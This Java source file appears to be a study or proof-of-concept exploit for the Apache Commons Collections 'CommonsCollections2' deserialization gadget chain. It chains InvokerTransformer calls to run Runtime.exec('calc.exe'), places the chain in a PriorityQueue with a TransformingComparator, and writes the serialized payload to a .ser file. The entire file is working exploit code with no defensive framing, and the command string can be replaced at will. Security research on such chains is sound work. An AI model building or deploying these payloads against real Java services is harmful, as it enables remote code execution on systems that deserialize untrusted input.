package CommonsCollections2;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.*;
import java.util.PriorityQueue;

public class exp {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"}
                )
        };
        ChainedTransformer template = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(template);


        PriorityQueue queue2 = new PriorityQueue(2, transformingComparator);
        queue2.add(1);
        queue2.add(2);


//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        FileOutputStream fo = new FileOutputStream(new File(System.getProperty("user.dir") + "/src/resources/commoncollections2.ser"));
        ObjectOutputStream oos = new ObjectOutputStream(fo);
        oos.writeObject(queue2);
        oos.close();
//        System.out.println(barr.toString());
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        ois.readObject();

//        FileOutputStream fo = new FileOutputStream(new File(System.getProperty("user.dir") + "/src/resources/commoncollections1.ser"));
//        ObjectOutputStream obj = new ObjectOutputStream(fo);
//        obj.writeObject(out);
//        obj.close();
    }


}
